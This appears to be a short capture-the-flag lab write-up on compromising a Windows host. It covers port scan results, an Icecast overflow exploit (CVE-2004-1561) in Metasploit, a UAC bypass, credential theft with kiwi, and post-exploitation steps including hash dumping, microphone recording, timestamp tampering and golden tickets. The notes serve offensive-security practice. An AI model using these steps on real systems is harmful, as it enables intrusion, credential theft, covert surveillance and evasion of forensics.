# BASIC INFO

```
ip_addr = 10.10.93.247

open port:
	135/tcp 		msrpc
	149/tcp 		nebios-ssn
	445/tcp 		microsoft-ds
	3389/tcp 		msrdp
	5357/tcp		http Microsoft HTTPAPI httpd 2.0
	8000/tcp		http Icecast
	49152-49154/tcp	msrpc
	49158-49160/tcp	msrpc

```

# GAIN ACCESS


> Icecast:
>> Exec code overflow
>> CVE-2004-1561


# EXPLOIT AND ESCALATE

```
msfconsole
use exploit/windows/http/icecast_header

run post/multi/recon/local_exploit_suggester

exploit/windows/local/bypassuac_eventvwr

```

# LOOTING

```

migrate -N spoolsv.exe

load kiwi

creds_all
```

> Dark's password = Password01!


# POST EXPLOITATION


> hashdump to dump all hash

> screenshare to watch remote user's desktop in real time

> record_mic to record with mic

> timestomp to modify timestamp

> golden_ticket_create to create a golden ticket that allows us to authenticate anywhere